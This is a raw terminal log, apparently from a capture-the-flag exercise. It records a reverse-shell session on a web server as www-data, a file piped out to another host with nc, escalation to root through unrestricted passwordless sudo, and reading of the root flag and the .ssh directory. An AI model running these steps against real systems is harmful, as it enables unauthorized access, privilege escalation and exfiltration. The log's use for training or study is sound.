@@ -1,0 +1,70 @@
+Script started on 2025-03-20 04:28:41+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 2027
+bash: cannot set terminal process group (938): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/usr/lib/cgi-bin$ [Kwww-data@ubuntu:/usr/lib/cgi-bin$ [K[?2004hwww-data@ubuntu:/usr/lib/cgi-bin$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K5UP3r53Cr37.py
+www-data@ubuntu:/usr/lib/cgi-bin$ [Kwww-data@ubuntu:/usr/lib/cgi-bin$ [K[?2004hwww-data@ubuntu:/usr/lib/cgi-bin$ dd if=[7m5UP3r53Cr37.py[27m5UP3r53Cr37.py status=progress | nc 10.8.61.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=5UP3r53Cr37.py status=progress | nc 10.8.61.245 4444
+[K<UP3r53Cr37.py status=progress | nc 10.8.61.245 4444
+[K0+1 records in
+0+1 records out
+485 bytes copied, 4.5426e-05 s, 10.7 MB/s
+[Kwww-data@ubuntu:/usr/lib/cgi-bin$ [Kwww-data@ubuntu:/usr/lib/cgi-bin$ [K[?2004hwww-data@ubuntu:/usr/lib/cgi-bin$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: ALL
+www-data@ubuntu:/usr/lib/cgi-bin$ [Kwww-data@ubuntu:/usr/lib/cgi-bin$ [K[?2004hwww-data@ubuntu:/usr/lib/cgi-bin$ sudo su[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo su
+[Ksudo su
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=0(root) gid=0(root) groups=0(root)
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kroot@ubuntu:/usr/lib/cgi-bin# [Kroot@ubuntu:/usr/lib/cgi-bin# [K[?2004hroot@ubuntu:/usr/lib/cgi-bin# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root[Kcd /root[Kcd /root
+root@ubuntu:~# [Kroot@ubuntu:~# [K[?2004hroot@ubuntu:~# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+bot.py  root.txt  snap  ssh.sh
+[Kroot@ubuntu:~# [Kroot@ubuntu:~# [K[?2004hroot@ubuntu:~# cat o[Kroot.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat root.txt
+[Kcat root.txt
+[K4dbe2259ae53846441cc2479b5475c72
+root@ubuntu:~# [Kroot@ubuntu:~# [K[?2004hroot@ubuntu:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 56
+drwx------  7 root root 4096 Jan 29  2024 .
+drwxr-xr-x 19 root root 4096 Mar 14  2023 ..
+lrwxrwxrwx  1 root root    9 Mar 14  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r--  1 root root  172 Mar 15  2023 bot.py
+drwx------  3 root root 4096 Aug 16  2023 .cache
+drwx------  3 root root 4096 Aug 17  2023 .config
+-rw-------  1 root root   33 Jan 29  2024 .lesshst
+drwxr-xr-x  3 root root 4096 Mar 14  2023 .local
+lrwxrwxrwx  1 root root    9 Mar 14  2023 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-r--------  1 root root   33 Mar 14  2023 root.txt
+-rw-r--r--  1 root root   66 Jan 29  2024 .selected_editor
+drwx------  5 root root 4096 Mar 14  2023 snap
+drwx------  2 root root 4096 Mar 14  2023 .ssh
+-rwxr-xr-x  1 root root   82 Jan 29  2024 ssh.sh
+root@ubuntu:~# [Kroot@ubuntu:~# [K[?2004hroot@ubuntu:~# cd .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh[Kcd .ssh[Kcd .ssh
+root@ubuntu:~/.ssh# [Kroot@ubuntu:~/.ssh# [K[?2004hroot@ubuntu:~/.ssh# k[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 8
+drwx------ 2 root root 4096 Mar 14  2023 .
+drwx------ 7 root root 4096 Jan 29  2024 ..
+-rw------- 1 root root    0 Mar 14  2023 authorized_keys
+root@ubuntu:~/.ssh# [Kroot@ubuntu:~/.ssh# [K[?2004hroot@ubuntu:~/.ssh# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kwww-data@ubuntu:/usr/lib/cgi-bin$ [Kwww-data@ubuntu:/usr/lib/cgi-bin$ [K[?2004hwww-data@ubuntu:/usr/lib/cgi-bin$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-03-20 04:36:03+03:00 [COMMAND_EXIT_CODE="0"]
